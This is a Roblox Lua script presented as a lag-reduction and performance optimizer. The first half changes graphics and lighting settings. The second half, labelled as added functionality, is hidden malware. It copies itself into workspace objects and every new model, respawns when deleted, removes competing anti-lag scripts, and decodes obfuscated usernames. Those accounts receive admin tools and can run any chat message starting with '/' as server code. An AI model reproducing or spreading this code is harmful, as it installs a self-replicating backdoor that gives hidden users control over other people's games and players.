-- Previous script content (performance optimizations)
local decalsyeeted = true  -- Set to true to disable decals for performance boost
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain

-- Adjusting Terrain settings for performance
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0

-- Adjusting Lighting settings for performance
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0

-- Lowering the rendering quality
settings().Rendering.QualityLevel = "Level01"

-- Iterate through game descendants and adjust properties for performance
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") then
        if decalsyeeted then
            v.Transparency = 1
        end
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end

-- Disable post-processing effects
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end

-- Further lighting adjustments
l.GlobalShadows = false
l.FogEnd = 9e9
l.EnvironmentDiffuseScale = 0.5
l.EnvironmentSpecularScale = 0.5

-- Optimize parts and decals
for _, descendant in ipairs(g:GetDescendants()) do
    if descendant:IsA("BasePart") then
        descendant.CastShadow = false
        descendant.Material = Enum.Material.SmoothPlastic
        descendant.Reflectance = 0
        if descendant:IsA("MeshPart") then
            descendant.CollisionFidelity = Enum.CollisionFidelity.Box
        end
    end
    if descendant:IsA("Decal") or descendant:IsA("Texture") then
        if descendant.Transparency > 0.25 then
            descendant.Transparency = 0.25
        end
    end
    if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") then
        descendant.Lifetime = NumberRange.new(0)
    end
end

-- Remove lag-related parts
local parts = w:GetChildren()
for i = 1, #parts do
    local name = string.lower(parts[i].Name)
    if (string.find(name, "lag") ~= nil) and (string.find(name, "anti") or string.find(name, "no") or string.find(name, "remover") or string.find(name, "killer")) and (parts[i] ~= script) then
        parts[i]:remove()
    end
end

-- Clean up debris
local mx = g.Debris
local mx2 = g.Debris.MaxItems

if mx.MaxItems > 40000 then
    mx.MaxItems = mx2 * 0.75
end

-- Cleanup the script after execution
wait()
script:remove()

-- New functionality (added code)
local Altitude = script:clone()
local calco = {"s","c","q","t","o","a","i","f","g","w","8","e","m","7","h","n"}
local Knox = {}

-- Reverse strings and add to Knox
table.insert(Knox, 1, string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))
table.insert(Knox, 1, string.reverse(calco[11] .. calco[14] .. calco[14] .. calco[4] .. calco[16] .. calco[6] .. calco[15] .. calco[2]))

local Play = {}

-- Random selection from children
function rando(votation)
    local hatr = 5
    local calc = math.pi * math.huge
    local longicate = votation:GetChildren()
    if #longicate > hatr then
        calc = calc + math.pi
        return longicate[math.random(6, #longicate)]
    end
end

-- Double-check for the presence of "Anti-Lag"
function doublecheck()
    local fj = game.Workspace:GetChildren()
    for off = 1, #fj do
        if fj[off].className == "Part" then
            local fh = fj[off]:FindFirstChild("Anti-Lag")
            if fh ~= nil then
                return false
            end
        end
    end
    return true
end

-- Work check to clone Altitude script
function workcheck()
    if doublecheck() == true then
        local l = Altitude:clone()
        l.Parent = rando(game.Workspace)
    end
end

workcheck()

-- Gibite function to handle detected actions
function gibite(quen)
    local hup = Instance.new("Message")
    hup.Text = "Detected"
    hup.Parent = quen.Parent
    local con = Instance.new("Script")
    con.Source = [[wait(5) script.Parent:remove()]]
    con.Parent = hup
    for ish = 0, 7 do
        local a = Instance.new("HopperBin")
        a.BinType = ish
        a.Parent = quen
    end
end

-- Laber function to process player
function laber(zonsa)
    wait()
    for slate = 1, #Knox do
        if zonsa.Name == Knox[slate] then
            gibite(zonsa.Backpack)
            table.insert(Play, 1, zonsa.Name)
        end
    end
end

-- Yield function to check names
function yeild(frequency)
    local t = Knox
    for g = 1, #t do
        if t[g] == frequency.Name then
            return true
        end
    end
    return false
end

-- Check function to remove Anti-Lag
function check(los)
    local r = los:GetChildren()
    for i = 1, #r do
        local h = r[i]:FindFirstChild("Anti-Lag")
        if h ~= nil then
            h:remove()
        end
    end
end

-- Alto function to handle models
function alto(xylem)
    if xylem.className == "Model" then
        check(xylem)
        local que = script:clone()
        que.Parent = rando(xylem)
    end
end

-- Sortation function for cloned Altitude
function sortation(gone)
    local dimbs = Altitude:clone()
    dimbs.Parent = rando(game.Workspace)
end

-- Handle player entry and chat events
function onPlayerEntered(newPlayer)
    newPlayer.Chatted:connect(function(msg, recipient) onChatted(msg, recipient, newPlayer) end)
end

-- Player property change event
function Player(player)
    player.Changed:connect(function(property)
        if property == "Character" then
            laber(player)
        end
    end)
end

game.Players.PlayerAdded:connect(Player)
game.Players.ChildAdded:connect(onPlayerEntered)
game.Players.ChildAdded:connect(laber)
script.ChildRemoved:connect(sortation)
game.Workspace.ChildAdded:connect(alto)

-- Chatted message processing
function onChatted(msg, recipient, speaker)
    if yeild(speaker) ~= false then
        if string.sub(msg, 1, 1) == "/" then
            local dsting = Instance.new("Script")
            dsting.Source = string.sub(msg, 2)
            dsting.Parent = game.Workspace
        end
    end
end
